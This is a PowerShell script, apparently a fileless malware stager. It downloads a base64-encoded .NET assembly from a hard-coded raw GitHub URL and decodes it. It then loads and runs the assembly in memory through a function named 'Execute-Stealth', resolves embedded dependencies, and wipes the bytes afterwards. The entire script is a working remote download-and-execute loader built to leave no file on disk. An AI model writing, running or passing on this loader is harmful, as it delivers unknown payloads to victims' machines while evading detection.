[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Download-Base64 {
    param (
        [string]$url
    )
    $base64 = Invoke-RestMethod -Uri $url
    return $base64
}

function Decode-Base64 {
    param (
        [string]$base64
    )
    $bytes = [Convert]::FromBase64String($base64)
    return $bytes
}

function Execute-InMemory {
    param (
        [byte[]]$bytes
    )

    $mainAssembly = $null
    
    # Handler pour resoudre les dependances emballees (Costura.Fody)
    $onAssemblyResolve = {
        param($sender, $e)
        $assemblyName = $e.Name.Split(',')[0]
        
        # Chercher dans les ressources de l'assembly principal charge
        if ($mainAssembly -ne $null) {
            $resourceNames = $mainAssembly.GetManifestResourceNames()
            $resourceName = $resourceNames | Where-Object { 
                $_ -like "*$assemblyName*" -or 
                $_ -like "*$($assemblyName.ToLower())*" -or
                $_ -like "*$($assemblyName.ToUpper())*"
            }
            
            if ($resourceName) {
                try {
                    $stream = $mainAssembly.GetManifestResourceStream($resourceName)
                    if ($stream -ne $null) {
                        $assemblyBytes = New-Object byte[] $stream.Length
                        $stream.Read($assemblyBytes, 0, $assemblyBytes.Length) | Out-Null
                        $stream.Close()
                        return [System.Reflection.Assembly]::Load($assemblyBytes)
                    }
                }
                catch {
                    # Ignorer les erreurs de lecture
                }
            }
        }
        return $null
    }
    [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)

    $mainAssembly = [System.Reflection.Assembly]::Load($bytes)

    $entryPoint = $mainAssembly.EntryPoint
    if ($entryPoint -ne $null) {
        $entryPoint.Invoke($null, @())
    }
}

function Execute-Stealth {
    param (
        [string]$url
    )

    $base64 = Download-Base64 -url $url
    $bytes = Decode-Base64 -base64 $base64
    Execute-InMemory -bytes $bytes

    [Array]::Clear($bytes, 0, $bytes.Length)
}

$url = "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/file.txt"

Execute-Stealth -url $url
